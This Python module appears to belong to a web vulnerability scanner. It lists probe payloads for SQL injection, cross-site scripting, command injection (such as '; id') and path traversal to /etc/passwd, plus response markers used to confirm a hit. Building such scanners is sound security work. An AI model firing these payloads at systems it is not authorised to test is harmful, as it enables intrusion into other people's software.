from __future__ import annotations

from models import VulnClass

PAYLOADS: dict[VulnClass, list[str]] = {
    VulnClass.SQLI: [
        "' OR '1'='1",
        "' OR SLEEP(2)-- -",
        "1' AND '1'='2",
    ],
    VulnClass.XSS: [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
    ],
    VulnClass.CMDI: [
        "; id",
        "| whoami",
        "`id`",
    ],
    VulnClass.PATH_TRAVERSAL: [
        "../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
    ],
}

SQL_ERROR_STRINGS = [
    "sql syntax",
    "mysql_fetch",
    "you have an error in your sql syntax",
    "warning: mysql",
]

PATH_TRAVERSAL_MARKERS = [
    "root:",
    "/bin/bash",
    "/bin/sh",
]

CMDI_MARKERS = [
    "uid=",
    "gid=",
]

BLOCK_PAGE_INDICATORS = [
    "hacking attempt detected",
    "attack detected",
    "request blocked",
    "forbidden",
]

TIMING_BASED_PAYLOADS = {"' OR SLEEP(2)-- -"}
TIMING_THRESHOLD_MS = 1800

BOOLEAN_SQLI_INDICATORS = {"' OR '1'='1", "1' AND '1'='2"}